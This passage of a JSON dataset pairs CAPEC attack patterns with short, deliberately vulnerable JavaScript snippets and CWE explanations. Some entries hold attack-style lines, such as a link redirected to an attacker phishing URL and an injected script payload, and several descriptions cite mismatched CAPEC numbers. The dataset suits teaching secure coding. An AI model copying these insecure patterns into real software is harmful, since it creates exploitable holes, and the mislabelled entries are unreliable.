        "code_snippet": "const http = require('http');\nconst url = require('url');\n\nhttp.createServer((req, res) => {\n  const queryObject = url.parse(req.url, true).query;\n  let transactionData = queryObject.data;\n\n  // CWE-311: Missing Encryption of Sensitive Data\n  // Sensitive transaction data is transmitted in plaintext\n  console.log('Received transaction data:', transactionData);\n\n  // CWE-345: Insufficient Verification of Data Authenticity\n  // No verification of the authenticity of the transaction data\n  if (transactionData) {\n    // CWE-471: Modification of Assumed-Immutable Data\n    // Attacker can modify the transaction data\n    transactionData = transactionData.replace('item1', 'item2');\n    console.log('Modified transaction data:', transactionData);\n  }\n\n  res.writeHead(200, {'Content-Type': 'text/plain'});\n  res.end('Transaction processed');\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet sets up a basic HTTP server that processes transaction data received via URL query parameters. The code demonstrates several vulnerabilities: \n1. **CWE-311 (Missing Encryption of Sensitive Data)**: The transaction data is transmitted in plaintext, making it susceptible to interception and tampering.\n2. **CWE-345 (Insufficient Verification of Data Authenticity)**: The server does not verify the authenticity of the transaction data, allowing any data to be accepted.\n3. **CWE-471 (Modification of Assumed-Immutable Data)**: The transaction data is assumed to be immutable but is modified by replacing 'item1' with 'item2'.\n\nThese vulnerabilities illustrate the main idea of the CAPEC, where an attacker can manipulate transaction data by intercepting and altering the communication between the client and server, leading to fraudulent transactions."
    },
    {
        "capec_id": "386",
        "capec_name": "Application API Navigation Remapping",
        "code_snippet": "function manipulateLink() {\n    // CWE-471: Modification of Assumed-Immutable Data\n    var originalLink = document.getElementById('userProfileLink');\n    if (originalLink) {\n        // CWE-345: Insufficient Verification of Data Authenticity\n        var maliciousLink = 'http://attacker.com/phishing';\n        // CWE-602: Client-Side Enforcement of Server-Side Security\n        originalLink.href = maliciousLink;\n    }\n}\n\n// Simulate an attacker injecting this script into a vulnerable application\nmanipulateLink();",
        "description": "This JavaScript code snippet demonstrates an attack where an attacker manipulates a link on a user's profile page to redirect to a malicious site. The function `manipulateLink` finds an element with the ID 'userProfileLink' and changes its `href` attribute to a malicious URL. This embodies the CAPEC concept of 'Application API Navigation Remapping' by altering the destination of a link to an attacker-controlled site. The code also highlights related CWEs: CWE-471 (modifying assumed-immutable data), CWE-345 (insufficient verification of data authenticity), and CWE-602 (client-side enforcement of server-side security)."
    },
    {
        "capec_id": "387",
        "capec_name": "Navigation Remapping To Propagate Malicious Content",
        "code_snippet": "const serverUrl = 'https://trustedserver.com/api/data';\n\nfunction fetchData() {\n  fetch(serverUrl)\n    .then(response => response.json())\n    .then(data => {\n      // Assume data is immutable and trusted\n      processData(data);\n    })\n    .catch(error => console.error('Error fetching data:', error));\n}\n\nfunction processData(data) {\n  // Client-side enforcement of server-side security\n  if (data.isValid) {\n    displayData(data);\n  } else {\n    console.error('Invalid data received');\n  }\n}\n\nfunction displayData(data) {\n  document.getElementById('content').innerHTML = data.content;\n}\n\n// Simulate an attacker modifying the data\nfetchData = function() {\n  const maliciousData = { isValid: true, content: '<script>alert(\"Hacked!\")</script>' };\n  processData(maliciousData);\n};\n\nfetchData();",
        "description": "This JavaScript code snippet demonstrates a scenario where an attacker manipulates the data fetched from a server to propagate malicious content. The `fetchData` function fetches data from a trusted server and assumes the data is immutable and trusted (CWE-471). The `processData` function enforces server-side security checks on the client side (CWE-602) and displays the data if it is considered valid. However, an attacker can override the `fetchData` function to inject malicious content, exploiting the lack of proper data authenticity verification (CWE-345) and origin validation (CWE-346). This code snippet embodies the main idea of CAPEC-111: Navigation Remapping To Propagate Malicious Content."
    },
    {
        "capec_id": "388",
        "capec_name": "Application API Button Hijacking",
        "code_snippet": "const apiEndpoint = 'https://api.example.com/getButtonData';\n\nfetch(apiEndpoint)\n  .then(response => response.json())\n  .then(data => {\n    // CWE-345: Insufficient Verification of Data Authenticity\n    if (!data || !data.buttonUrl) {\n      throw new Error('Invalid data received from API');\n    }\n\n    // CWE-602: Client-Side Enforcement of Server-Side Security\n    const button = document.createElement('button');\n    button.innerText = 'Click Me';\n    button.onclick = () => {\n      // CWE-311: Missing Encryption of Sensitive Data\n      window.location.href = data.buttonUrl;\n    };\n    document.body.appendChild(button);\n  })\n  .catch(error => console.error('Error fetching button data:', error));",
        "description": "This JavaScript code snippet demonstrates a vulnerable implementation of fetching button data from an API and dynamically creating a button on the client-side. The code fetches data from an API endpoint and assumes the data is authentic without proper verification (CWE-345). It then creates a button and sets its click event to redirect the user to a URL provided by the API response. This URL could be manipulated by an attacker to point to a malicious site (CAPEC: Application API Button Hijacking). Additionally, the code relies on the client-side to enforce security (CWE-602) and does not encrypt sensitive data (CWE-311), making it susceptible to various attacks."
    },
    {
        "capec_id": "389",
        "capec_name": "Content Spoofing Via Application API Manipulation",
        "code_snippet": "const http = require('http');\n\nconst options = {\n  hostname: 'example.com',\n  port: 80,\n  path: '/api/data',\n  method: 'GET',\n  headers: {\n    'Content-Type': 'application/json'\n  }\n};\n\nconst req = http.request(options, (res) => {\n  let data = '';\n\n  res.on('data', (chunk) => {\n    data += chunk;\n  });\n\n  res.on('end', () => {\n    // Manipulate the response data\n    let manipulatedData = data.replace(/originalContent/g, 'spoofedContent');\n    console.log('Manipulated Data:', manipulatedData);\n  });\n});\n\nreq.on('error', (e) => {\n  console.error(`Problem with request: ${e.message}`);\n});\n\nreq.end();",
        "description": "This JavaScript code snippet demonstrates a basic example of content spoofing via application API manipulation. The code makes an HTTP GET request to an API endpoint and intercepts the response data. It then manipulates the response content by replacing 'originalContent' with 'spoofedContent'. This represents the CAPEC-94 attack pattern where an attacker manipulates the data between the client and server to produce deceptive content. The code also highlights CWE-353 (Missing Support for Integrity Check) as it does not verify the integrity of the data, CWE-602 (Client-Side Enforcement of Server-Side Security) by relying on client-side manipulation, and CWE-603 (Use of Client-Side Authentication) by not performing any server-side authentication checks."
    },
    {
        "capec_id": "390",
        "capec_name": "Bypassing Physical Security",
        "code_snippet": "const accessControl = (user) => {\n  if (user.hasPhysicalAccess) {\n    console.log('Access granted to sensitive information.');\n  } else {\n    console.log('Access denied.');\n  }\n};\n\nconst simulateVoltageGlitch = () => {\n  console.log('Voltage glitch detected! Bypassing security checks...');\n  accessControl({ hasPhysicalAccess: true });\n};\n\nconst simulateEMFI = () => {\n  console.log('EMFI attack detected! Bypassing security checks...');\n  accessControl({ hasPhysicalAccess: true });\n};\n\n// Simulate an attack\nsimulateVoltageGlitch();\nsimulateEMFI();",
        "description": "This JavaScript code snippet simulates a scenario where physical security mechanisms are bypassed through voltage glitches and electromagnetic fault injection (EMFI) attacks. The `accessControl` function checks if a user has physical access to grant or deny access to sensitive information. The `simulateVoltageGlitch` and `simulateEMFI` functions simulate attacks that bypass these security checks by logging a message and then granting access regardless of the actual physical access status. This represents the CAPEC's main idea of bypassing physical security and highlights related CWEs such as improper protection against voltage and clock glitches (CWE-1247) and electromagnetic fault injection (CWE-1319)."
    },
    {
        "capec_id": "391",
        "capec_name": "Bypassing Physical Locks",
        "code_snippet": "class PhysicalLock {\n  constructor() {\n    this.locked = true;\n    this.debugMode = false;\n  }\n\n  unlock() {\n    if (this.debugMode) {\n      console.log('Debug mode active: Lock bypassed.');\n      this.locked = false;\n    } else {\n      console.log('Attempt to unlock failed: Access denied.');\n    }\n  }\n\n  setDebugMode(mode) {\n    this.debugMode = mode;\n  }\n}\n\n// Example usage\nconst lock = new PhysicalLock();\nlock.setDebugMode(true); // Improperly enabling debug mode\nlock.unlock(); // Bypasses the lock due to debug mode",
        "description": "This JavaScript code snippet represents a simplified model of a physical lock mechanism that can be bypassed by enabling a debug mode, embodying the main idea of CAPEC-170: Bypassing Physical Locks. The `PhysicalLock` class has a `locked` state and a `debugMode` flag. The `unlock` method checks if the debug mode is active; if it is, the lock is bypassed, demonstrating CWE-1234: Hardware Internal or Debug Modes Allow Override of Locks. This snippet highlights the vulnerability where an attacker with physical access could exploit debug mode to bypass security measures."
    },
    {
        "capec_id": "392",
        "capec_name": "Lock Bumping",
        "code_snippet": "const lock = { isLocked: true, lockBit: 1, addressRegion: '0x00FF', powerState: 'ON' };\n\nfunction bumpKeyAttack(lock) {\n  // Simulate improper prevention of lock bit modification (CWE-1231)\n  lock.lockBit = 0;\n  // Simulate insufficient granularity of address regions (CWE-1222)\n  if (lock.addressRegion === '0x00FF') {\n    lock.isLocked = false;\n  }\n  // Simulate improper lock behavior after power state transition (CWE-1232)\n  if (lock.powerState === 'OFF') {\n    lock.isLocked = false;\n  }\n  return lock.isLocked ? 'Lock is still secure' : 'Lock has been bumped open';\n}\n\nconsole.log(bumpKeyAttack(lock));",
        "description": "This JavaScript code snippet simulates a lock bumping attack by exploiting vulnerabilities related to lock bit modification, address region protection, and power state transitions. The `lock` object represents a lock with properties such as `isLocked`, `lockBit`, `addressRegion`, and `powerState`. The `bumpKeyAttack` function attempts to 'bump' the lock open by modifying the `lockBit`, checking the address region, and simulating a power state transition. If any of these conditions are met, the lock is considered 'bumped' open. This code embodies the main idea of the CAPEC by demonstrating how an attacker might exploit these weaknesses to gain unauthorized access."
    },
    {
        "capec_id": "393",
        "capec_name": "Lock Picking",
        "code_snippet": "class Lock {\n  constructor() {\n    this.locked = false;\n  }\n\n  lock() {\n    if (!this.locked) {\n      this.locked = true;\n      console.log('Resource is now locked.');\n    } else {\n      console.log('Resource is already locked.');\n    }\n  }\n\n  unlock() {\n    if (this.locked) {\n      this.locked = false;\n      console.log('Resource is now unlocked.');\n    } else {\n      console.log('Resource was not locked.'); // CWE-832\n    }\n  }\n\n  isLocked() {\n    return this.locked;\n  }\n}\n\n// Simulating lock picking\nconst lock = new Lock();\nlock.lock();\n\n// Attacker bypasses the lock\nlock.locked = false; // CWE-1231\nconsole.log('Lock status after attack:', lock.isLocked() ? 'Locked' : 'Unlocked');\n\n// Attempting to unlock an already unlocked resource\nlock.unlock(); // CWE-832",
        "description": "This JavaScript code snippet defines a simple Lock class that simulates locking and unlocking a resource. The lock() method sets the lock state to true if it is not already locked, and the unlock() method sets the lock state to false if it is currently locked. The isLocked() method returns the current lock state. The code also demonstrates a lock picking attack by directly modifying the lock state (CWE-1231: Improper Prevention of Lock Bit Modification). Additionally, it shows an attempt to unlock a resource that is not locked (CWE-832: Unlock of a Resource that is not Locked). This snippet embodies the main idea of the CAPEC by illustrating how an attacker can bypass a lock mechanism and the potential weaknesses in lock management."
    },
    {
        "capec_id": "394",
        "capec_name": "Using a Snap Gun Lock to Force a Lock",
        "code_snippet": "class Lock {\n  constructor() {\n    this.locked = true;\n    this.lockBit = 1; // Represents the lock bit\n  }\n\n  unlock() {\n    if (this.lockBit === 1) {\n      console.log('Lock is protected, cannot unlock directly.');\n    } else {\n      this.locked = false;\n      console.log('Lock is now unlocked.');\n    }\n  }\n\n  forceUnlock() {\n    // Simulate the snap gun effect by directly modifying the lock state\n    this.locked = false;\n    console.log('Lock has been forced open, potential damage detected.');\n  }\n\n  modifyLockBit(newBit) {\n    // CWE-1231: Improper Prevention of Lock Bit Modification\n    this.lockBit = newBit;\n    console.log('Lock bit modified to:', newBit);\n  }\n}\n\nconst myLock = new Lock();\nmyLock.unlock(); // Attempt to unlock normally\nmyLock.modifyLockBit(0); // Improperly modify the lock bit\nmyLock.unlock(); // Now unlocks due to modified lock bit\nmyLock.forceUnlock(); // Force unlock, simulating snap gun effect",
        "description": "This JavaScript code snippet represents a simplified model of a lock mechanism, embodying the main idea of the CAPEC 'Using a Snap Gun Lock to Force a Lock'. The 'Lock' class has methods to unlock the lock normally, force unlock it (simulating the snap gun effect), and modify the lock bit (related to CWE-1231: Improper Prevention of Lock Bit Modification). The 'forceUnlock' method directly changes the lock state, representing the physical forcing of a lock using a snap gun, which may leave evidence of tampering. The 'modifyLockBit' method demonstrates a security weakness where the lock bit can be improperly modified, allowing the lock to be unlocked without proper authorization."
    },
    {
        "capec_id": "395",
        "capec_name": "Bypassing Electronic Locks and Access Controls",
        "code_snippet": "const crypto = require('crypto');\n\n// Hard-coded cryptographic key (CWE-321)\nconst hardCodedKey = '1234567890abcdef';\n\n// Function to encrypt data using a broken cryptographic algorithm (CWE-327)\nfunction encryptData(data) {\n  const cipher = crypto.createCipher('des-ecb', hardCodedKey); // DES is considered broken\n  let encrypted = cipher.update(data, 'utf8', 'hex');\n  encrypted += cipher.final('hex');\n  return encrypted;\n}\n\n// Simulate access control check\nfunction accessControl(cardData) {\n  const encryptedCardData = encryptData(cardData);\n  // Simulate a check against a stored encrypted card data\n  const storedEncryptedCardData = '5d41402abc4b2a76b9719d911017c592'; // Example hash\n  if (encryptedCardData === storedEncryptedCardData) {\n    console.log('Access Granted');\n  } else {\n    console.log('Access Denied');\n  }\n}\n\n// Example usage\nconst cardData = 'validCardData';\naccessControl(cardData);",
        "description": "This JavaScript code snippet demonstrates a simplified electronic access control system that uses a hard-coded cryptographic key (CWE-321) and a broken cryptographic algorithm (DES, CWE-327) to encrypt card data. The `encryptData` function encrypts the card data using DES in ECB mode, which is known to be insecure. The `accessControl` function simulates an access control check by comparing the encrypted card data with a stored encrypted value. This code embodies the main idea of CAPEC-115: 'Bypassing Electronic Locks and Access Controls', by illustrating how weak cryptographic practices can be exploited to bypass security mechanisms."
    },
    {
        "capec_id": "396",
        "capec_name": "DEPRECATED: Bypassing Card or Badge-Based Systems",
        "code_snippet": "const crypto = require('crypto');\n\nfunction authenticate(cardData) {\n  // Simulate reading card data (e.g., magnetic stripe or RFID)\n  const storedCardData = '1234567890'; // Example of stored card data\n\n  // Vulnerable comparison allowing authentication bypass by spoofing\n  if (cardData == storedCardData) {\n    console.log('Authentication successful');\n  } else {\n    console.log('Authentication failed');\n  }\n}\n\n// Simulate an attacker capturing and replaying card data\nconst capturedCardData = '1234567890';\nauthenticate(capturedCardData);",
        "description": "This JavaScript code snippet demonstrates a vulnerable authentication mechanism for a card-based system. The `authenticate` function compares the provided card data with stored card data using a simple equality check. This approach is vulnerable to authentication bypass by spoofing (CWE-290) and capture-replay attacks (CWE-294). An attacker can capture the card data and replay it to gain unauthorized access. The code highlights the risks associated with using weak or broken authentication schemes and the importance of implementing robust cryptographic methods to protect against such attacks."
    },
    {
        "capec_id": "397",
        "capec_name": "Cloning Magnetic Strip Cards",
        "code_snippet": "const magstripeData = '1234567890123456'; // Example magstripe data\n\nclass MagstripeCard {\n  constructor(data) {\n    this.data = data;\n  }\n\n  clone() {\n    return new MagstripeCard(this.data);\n  }\n}\n\n// Simulate reading a magstripe card\nconst originalCard = new MagstripeCard(magstripeData);\nconsole.log('Original Card Data:', originalCard.data);\n\n// Clone the card to create a duplicate\nconst clonedCard = originalCard.clone();\nconsole.log('Cloned Card Data:', clonedCard.data);\n\n// Simulate using the cloned card for unauthorized access\nfunction accessControl(card) {\n  if (card.data === magstripeData) {\n    console.log('Access Granted');\n  } else {\n    console.log('Access Denied');\n  }\n}\n\naccessControl(clonedCard);",
        "description": "This JavaScript code snippet demonstrates the concept of cloning magnetic strip cards to gain unauthorized access, as described in the CAPEC. The `MagstripeCard` class contains sensitive data (the magstripe data) and is cloneable, which aligns with CWE-498 (Cloneable Class Containing Sensitive Information). The `clone` method allows for the duplication of the card's data. The `accessControl` function simulates an access control system that grants access based on the magstripe data. By cloning the original card, an attacker can create a duplicate that grants the same access, illustrating the vulnerability of magstripe technology to unauthorized duplication."
    },
    {
        "capec_id": "398",
        "capec_name": "Magnetic Strip Card Brute Force Attacks",
        "code_snippet": "const crypto = require('crypto');\n\n// Hard-coded cryptographic key (CWE-321)\nconst hardCodedKey = '1234567890abcdef';\n\n// Simulate reading data from a magnetic strip card\nfunction readCardData(card) {\n  // Use a broken cryptographic algorithm (CWE-327)\n  const decipher = crypto.createDecipher('aes-128-ecb', hardCodedKey);\n  let decrypted = decipher.update(card, 'hex', 'utf8');\n  decrypted += decipher.final('utf8');\n  return decrypted;\n}\n\n// Simulate brute force attack by generating new card data\nfunction bruteForceCardData(card1, card2) {\n  const data1 = readCardData(card1);\n  const data2 = readCardData(card2);\n  // Generate new card data by combining sequences from both cards\n  const newCardData = data1.slice(0, 8) + data2.slice(8);\n  return newCardData;\n}\n\n// Example card data (hex-encoded)\nconst card1 = '4a6566657265736f6e';\nconst card2 = '4a6f686e446f65';\n\n// Generate new card data\nconst newCard = bruteForceCardData(card1, card2);\nconsole.log('New Card Data:', newCard);",
        "description": "This JavaScript code snippet demonstrates a simplified version of a magnetic strip card brute force attack. It reads data from two magnetic strip cards using a hard-coded cryptographic key (CWE-321) and a broken cryptographic algorithm (CWE-327). The code then generates new card data by combining sequences from both cards, representing the unauthorized access and impersonation described in the CAPEC. The use of hard-coded keys and weak cryptographic algorithms makes the system vulnerable to such attacks."
    },
    {
        "capec_id": "399",
        "capec_name": "Cloning RFID Cards or Chips",
        "code_snippet": "const rfidReader = require('rfid-reader');\nconst clonedRFID = {};\n\nrfidReader.on('data', (data) => {\n  const identifier = data.id;\n  if (!clonedRFID[identifier]) {\n    clonedRFID[identifier] = data;\n    console.log(`Cloned RFID with ID: ${identifier}`);\n  } else {\n    console.log(`RFID with ID: ${identifier} already cloned.`);\n  }\n});\n\n// Simulate an RFID read event\nrfidReader.emit('data', { id: '12345', info: 'Access Granted' });\nrfidReader.emit('data', { id: '12345', info: 'Access Granted' });",
        "description": "This JavaScript code snippet simulates the cloning of RFID cards or chips. It uses an RFID reader module to listen for RFID data. When RFID data is received, it checks if the identifier has already been cloned. If not, it clones the RFID data and stores it in the 'clonedRFID' object. This demonstrates the vulnerability of RFID systems to cloning attacks, where an attacker can duplicate RFID signals to gain unauthorized access. The code also highlights CWE-694 (Use of Multiple Resources with Duplicate Identifier) by allowing the same identifier to be cloned multiple times, which should be unique."
    },
    {
        "capec_id": "400",
        "capec_name": "RFID Chip Deactivation or Destruction",
        "code_snippet": "class RFIDChip {\n  constructor() {\n    this.active = true;\n    this.sensitiveData = 'Sensitive Information';\n  }\n\n  // CWE-1191: Improper access control to internal registers\n  debugInterface(accessCode) {\n    if (accessCode === '1234') { // Weak access control\n      return 'Access granted to internal registers';\n    } else {\n      return 'Access denied';\n    }\n  }\n\n  // CWE-1334: Unauthorized error injection\n  injectError() {\n    this.active = false; // Deactivates the RFID chip\n    return 'Error injected, chip deactivated';\n  }\n\n  // CWE-1320: Disable alerts\n  disableAlerts() {\n    console.log = function() {}; // Disables logging of alerts\n    return 'Alerts disabled';\n  }\n\n  // CWE-1266: Improper scrubbing of sensitive data\n  decommission() {\n    this.sensitiveData = null; // Attempt to scrub data\n    return 'Chip decommissioned';\n  }\n\n  // CWE-1290: Incorrect decoding of security identifiers\n  decodeSecurityIdentifier(identifier) {\n    if (identifier === 'secure') {\n      return 'Access granted';\n    } else {\n      return 'Access denied';\n    }\n  }\n}\n\n// Example usage\nconst rfid = new RFIDChip();\nconsole.log(rfid.debugInterface('1234'));\nconsole.log(rfid.injectError());\nconsole.log(rfid.disableAlerts());\nconsole.log(rfid.decommission());\nconsole.log(rfid.decodeSecurityIdentifier('insecure'));\n",
        "description": "This JavaScript code snippet represents a simplified model of an RFID chip with vulnerabilities that align with the CAPEC description and related CWEs. The RFIDChip class includes methods that demonstrate improper access control (CWE-1191), unauthorized error injection (CWE-1334), disabling alerts (CWE-1320), improper scrubbing of sensitive data (CWE-1266), and incorrect decoding of security identifiers (CWE-1290). The example usage at the end shows how an attacker might exploit these vulnerabilities to deactivate the RFID chip, disable alerts, and improperly access or scrub sensitive data."
    },
    {
        "capec_id": "401",
        "capec_name": "Physically Hacking Hardware",
        "code_snippet": "const fs = require('fs');\nconst hardwareAccess = require('hardware-access');\n\n// Simulate improper physical access control\nif (fs.existsSync('/dev/hardware')) {\n  // Simulate improper restriction of software interfaces to hardware features\n  hardwareAccess.enableDebugMode();\n  \n  // Simulate improper protection against voltage and clock glitches\n  hardwareAccess.setVoltage(5.0);\n  hardwareAccess.setClockSpeed(3.0);\n  \n  // Simulate hardware allowing activation of test or debug logic at runtime\n  if (hardwareAccess.isDebugModeEnabled()) {\n    console.log('Debug mode activated. Hardware state can be altered.');\n    \n    // Simulate improper protection of physical side channels\n    const sensitiveData = hardwareAccess.readSensitiveData();\n    console.log('Sensitive Data:', sensitiveData);\n  }\n}",
        "description": "This JavaScript code snippet simulates a scenario where an adversary exploits various hardware vulnerabilities as described in the CAPEC and related CWEs. The code checks for the existence of a hardware device, simulating improper physical access control (CWE-1263). It then enables debug mode, representing improper restriction of software interfaces to hardware features (CWE-1256). The code sets voltage and clock speed, simulating improper protection against voltage and clock glitches (CWE-1247). It checks if debug mode is enabled, representing hardware allowing activation of test or debug logic at runtime (CWE-1313). Finally, it reads and logs sensitive data, simulating improper protection of physical side channels (CWE-1300). This code embodies the main idea of physically hacking hardware by exploiting weaknesses in access control and hardware protection mechanisms."
    },
    {
        "capec_id": "402",
        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "const hardCodedPassword = 'defaultPassword';\n\nfunction authenticate(password) {\n  if (password === hardCodedPassword) {\n    console.log('Access granted');\n    return true;\n  } else {\n    console.log('Access denied');\n    return false;\n  }\n}\n\nfunction updatePassword(newPassword) {\n  // Missing proper authorization check\n  hardCodedPassword = newPassword;\n  console.log('Password updated');\n}\n\n// Simulating the bypass\nif (authenticate('wrongPassword')) {\n  updatePassword('newPassword');\n  authenticate('newPassword');\n} else {\n  // Bypassing authentication by directly updating the password\n  updatePassword('newPassword');\n  authenticate('newPassword');\n}",
        "description": "This JavaScript code snippet demonstrates a vulnerability where an attacker can bypass ATA password security. The `authenticate` function checks a hard-coded password, representing CWE-259 and CWE-798. The `updatePassword` function allows updating the password without proper authorization checks, representing CWE-285. The code simulates an attack where the attacker bypasses the authentication by directly updating the password, exploiting the lack of proper authorization and hard-coded credentials. This embodies the main idea of CAPEC-Bypassing ATA Password Security."
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  // Log request details\n  fs.appendFile('server.log', `Request: ${req.url}\\n`, (err) => {\n    if (err) throw err;\n  });\n\n  // Simulate authentication bypass\n  if (req.url === '/admin') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Welcome to the admin panel');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080);\n\nconsole.log('Server running at http://127.0.0.1:8080/');",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server logs all incoming requests to a file named 'server.log', which can lead to information exposure through server log files (related to deprecated CWE-533). Additionally, the code contains a simulated authentication bypass vulnerability (related to deprecated CWE-592) by allowing access to the '/admin' route without proper authentication checks. This snippet embodies the main idea of the deprecated CAPEC-118 by demonstrating how information can be gathered and analyzed (through logging) and how security weaknesses (like authentication bypass) can be exploited."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
        "code_snippet": "const http = require('http');\nconst fs = require('fs');\n\nhttp.createServer((req, res) => {\n  // Log request details\n  fs.appendFile('server.log', `Request: ${req.url}\\n`, (err) => {\n    if (err) throw err;\n  });\n\n  // Simulate authentication bypass\n  if (req.url === '/admin') {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Welcome to the admin panel');\n  } else {\n    res.writeHead(404, {'Content-Type': 'text/plain'});\n    res.end('Not Found');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
        "description": "This JavaScript code snippet creates a simple HTTP server using Node.js. The server logs all incoming requests to a file named 'server.log', which can lead to information exposure through server log files (related to deprecated CWE-533). Additionally, the code contains a simulated authentication bypass vulnerability (related to deprecated CWE-592) by allowing access to the '/admin' route without proper authentication checks. This snippet embodies the main idea of the deprecated CAPEC by demonstrating how improper handling of information and authentication can lead to security vulnerabilities."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
        "code_snippet": "const fs = require('fs');\n\n// Simulate storing sensitive information in cleartext\nconst sensitiveData = 'User: admin, Password: admin123';\nfs.writeFileSync('sensitive_info.txt', sensitiveData);\n\n// Simulate generating a core dump file\nconst coreDump = 'Core dump data...';\nfs.writeFileSync('core_dump.txt', coreDump);\n\n// Simulate storing a version-control repository in an accessible directory\nconst repoData = 'Version control data...';\nfs.writeFileSync('public/repo/.git/config', repoData);\n\nconsole.log('Sensitive data, core dump, and version control repository stored in accessible locations.');",
        "description": "This JavaScript code snippet demonstrates several vulnerabilities related to the CAPEC 'Dumpster Diving' attack. It simulates the storage of sensitive information in cleartext, the generation of a core dump file, and the storage of a version-control repository in an accessible directory. These actions represent potential weaknesses that an adversary could exploit by searching through discarded or improperly secured files to gather sensitive information. The code highlights the importance of securely handling sensitive data to prevent unauthorized access."
    },
    {
        "capec_id": "407",
        "capec_name": "Pretexting",
        "code_snippet": "const express = require('express');\nconst session = require('express-session');\nconst app = express();\n\napp.use(session({\n  secret: 'secret-key',\n  resave: false,\n  saveUninitialized: true,\n  cookie: { secure: false }\n}));\n\napp.post('/login', (req, res) => {\n  const { username, password } = req.body;\n  // Simulate user authentication\n  if (username === 'admin' && password === 'password') {\n    req.session.user = { username: 'admin' };\n    res.send('Logged in');\n  } else {\n    res.send('Invalid credentials');\n  }\n});\n\napp.get('/sensitive-data', (req, res) => {\n  if (req.session.user && req.session.user.username === 'admin') {\n    res.send('Sensitive Information');\n  } else {\n    res.send('Unauthorized');\n  }\n});\n\napp.listen(3000, () => {\n  console.log('Server running on port 3000');\n});",
        "description": "This JavaScript code snippet uses the Express framework to create a simple web server with session management. The code demonstrates a login endpoint and an endpoint to access sensitive data. The login endpoint does not invalidate any existing session identifier (CWE-384), allowing an attacker to potentially hijack a session. The session cookie is not marked as secure (CWE-300), making it vulnerable to interception. The code also does not properly verify the identity of the user accessing the sensitive data endpoint (CWE-200), potentially exposing sensitive information to unauthorized actors. This setup can be exploited by an adversary using pretexting to manipulate users into revealing their credentials or session information, thereby gaining unauthorized access to sensitive data."
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "const fs = require('fs');\n\n// Vulnerable code: Storing sensitive information in a log file\nfunction logSensitiveData(data) {\n  const logFile = 'server.log';\n  fs.appendFileSync(logFile, `Sensitive Data: ${data}\\n`);\n}\n\n// Example usage\nlogSensitiveData('User password: 12345');",
        "description": "This JavaScript code snippet demonstrates a vulnerability where sensitive information is logged into a server log file. The function `logSensitiveData` appends sensitive data to a file named 'server.log'. This embodies the deprecated CAPEC pattern of 'Information Gathering from Traditional Sources' and related CWEs such as 'Information Exposure Through Server Log Files' (CWE-533) and 'Information Exposure Through Debug Log Files' (CWE-534). The main idea is to highlight the risk of exposing sensitive information through improper logging practices."
    },
    {
        "capec_id": "409",
        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "const fs = require('fs');\nconst dns = require('dns');\n\n// Vulnerable: Storing sensitive data without encryption\nlet sensitiveData = 'user_password=12345';\nfs.writeFileSync('data.txt', sensitiveData);\n\n// Vulnerable: Logging sensitive information\nconsole.log('Sensitive Data:', sensitiveData);\n\n// Vulnerable: Making security decisions based on DNS lookups\nconst domain = 'example.com';\ndns.lookup(domain, (err, address) => {\n  if (err) throw err;\n  if (address === '192.168.1.1') {\n    console.log('Access granted');\n  } else {\n    console.log('Access denied');\n  }\n});",
        "description": "This JavaScript code snippet demonstrates several deprecated vulnerabilities related to information exposure and improper handling of sensitive data. The code stores sensitive data in a file without encryption (CWE-217, CWE-218), logs sensitive information to the console (CWE-534, CWE-533), and makes security decisions based on DNS lookups (CWE-247). These practices can lead to information leakage and unauthorized access, highlighting the importance of proper data protection and secure coding practices."
    },
    {
        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "const sensitiveInfo = 'UserPassword123';\n\nfunction handleRequest(request) {\n  if (request.source === 'trustedSource') {\n    console.log('Processing request from trusted source');\n    // Truncate sensitive information for logging\n    console.log('Sensitive Info: ' + sensitiveInfo.substring(0, 5) + '...');\n  } else {\n    console.log('Request from untrusted source');\n  }\n}\n\n// Simulate a request from an untrusted source\nconst fakeRequest = { source: 'untrustedSource' };\nhandleRequest(fakeRequest);",
        "description": "This JavaScript code snippet demonstrates a scenario where sensitive information could be exposed due to improper verification of the source of a communication channel (CWE-940). The function `handleRequest` processes requests based on their source. If the source is 'trustedSource', it logs a truncated version of sensitive information (CWE-222). However, the verification is simplistic and could be easily bypassed, leading to potential exposure of sensitive information (CWE-200). This snippet embodies the main idea of CAPEC-419 (Information Elicitation) by showing how an adversary could exploit weak source verification and observable discrepancies to extract sensitive information."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "const fs = require('fs');\nconst http = require('http');\n\nhttp.createServer((req, res) => {\n  const logData = `Request from ${req.connection.remoteAddress} at ${new Date().toISOString()}`;\n  fs.appendFile('server.log', logData + '\\n', (err) => {\n    if (err) throw err;\n  });\n\n  if (req.url === '/admin' && req.headers['x-auth'] !== 'secret-token') {\n    res.writeHead(403, {'Content-Type': 'text/plain'});\n    res.end('Forbidden');\n  } else {\n    res.writeHead(200, {'Content-Type': 'text/plain'});\n    res.end('Welcome to the admin page');\n  }\n}).listen(8080, () => {\n  console.log('Server running at http://127.0.0.1:8080/');\n});",
